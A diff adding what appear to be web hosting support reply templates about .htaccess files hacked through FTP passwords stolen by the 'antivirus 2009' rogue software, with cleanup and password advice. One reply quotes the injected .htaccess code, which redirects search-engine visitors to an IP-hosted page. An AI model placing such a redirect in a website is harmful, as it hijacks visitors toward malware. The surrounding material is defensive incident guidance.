@@ -1,0 +1,37 @@
+(6:04:34) dethmix: http://www.bleepingcomputer.com/forums/topic154973.html
+
+
+I am terribly sorry for the issue you have faced, seems that your .htaccess files were hacked and now they contain the next code only:
+
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} .*google.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*aol.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*msn.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*altavista.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*ask.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*yahoo.*$ [NC]
+RewriteRule .* http://89.28.13.202/in.html?s=ix [R,L]
+
+Please investigate .htaccess files and if you need to restore them please provide us the domains for which that should be done and the preferred date of the backup in order we can ask our administrators to provide you them.
+In order to avoid further hacking attempts I would suggest you to scan your local machine for anti-viruses as your FTP details might have been stolen with trojan.
+
+I also recommend you to change your current FTP password through the Control Panel (Manage -> FTP manager -> Password icon). Some widespread trojans have a functions to steal FTP passwords from user`s local PC`s and send these passwords to hackers (or special bots which were made by hackers). So you need to scan your local PC for viruses (using in-depth scanning) and change your current FTP password.
+
+Please also note that your files are located on the Linux-based server and you are able to change file/folder permissions so make sure you do not have any "open" files/folders with write permissions set for all.
+So please check if any folders has full granted permissions 777 set, which is means that it's world writeable for anyone from the Web. Recommended permissions are 755.
+
+After  this  is  done we strongly recommend you to download one of the programs created  specifically  for antivirus 2009" removal and scan your  computer  with  it.  One  of  such  programs  is available  at:  http://www.bleepingcomputer.com/malware-removal/uninstall-antivirus-2009
+
+
+The issue you are referring to is a result of recent virus attack that spread  wide  over  the  Internet.  As far as our security analyst can tell,  all  of  these  hacks  are being conducted via malware that has gained  access  to  your  FTP login information. This rogue anti-virus software  installs  malware  on  your  computer  that  then sends your sensitive  data  back to a source. This source then hacks your account and  installs  .htaccess  files  that  redirect to other sites for the download of this same rogue anti-virus software. In  order  to  bring  down  the  negative  effect  of  the  virus  our technicians  have  performed  server  checkup and removed all injected 
+.htaccess  files.  At the moment the server is completely cleaned from malicious  files.  Due  to  the  fact  that  virus overwrites original .htaccess  file,  we  suggest  you  to use your website backup or your script original package to restore proper .htaccess. After  this  is  done we strongly recommend you to download one of the programs  created  specifically  for "antivirus 2009" removal and scan your  computer  with  it.  One  of  such  programs  is  available  at:  http://www.bleepingcomputer.com/malware-removal/uninstall-antivirus-2009
+
+		New One
+This hack that you are referring to is becoming more prevalent across the internet. As far as our security analyst can tell, all of these hacks are being conducted via malware that has gained access to your ftp login information. 
+You will need to follow the following steps to protect your domains/account in the future. Go to the following link and follow the removal instructions for the removal of this malware. You will need to do this on any computer that has accessed your site via ftp.
+This rogue anti-virus software installs malware on your computer that then sends your sensitive data back to a source. This source then hacks your account and installs .htaccess files that redirect to other sites for the download of this same rogue anti-virus software. Information on how this virus originated on the web can be found at the following link: http://www.techpavan.com/2008/07/15/google-tips-red-alert-never-consider-them/
+
+As of today, many anti-virus websites have updated their lists and most are reporting they can remove the virus. 
+However, there are also reports that show it doesn't get removed. Best solution at this time is to to download one of the programs created specifically for  "antivirus 2009" removal. One of such programs is available at: http://www.bleepingcomputer.com/malware-removal/uninstall-antivirus-2009 
+Once and only once you have checked your computer and/or removed this av2009.exe file, then you will need to change your ftp password information for all of your domains. You will also need to delete these htaccess files from all of your sites. If you have been contacted by google regarding your sites' security, then you will need to follow the directions in this email to have your site re-scanned. This may take some time to resolve if google has cached your site while the injected htaccess files were on your domain.
+If you have questions regarding any of this information, please contact our support anytime.
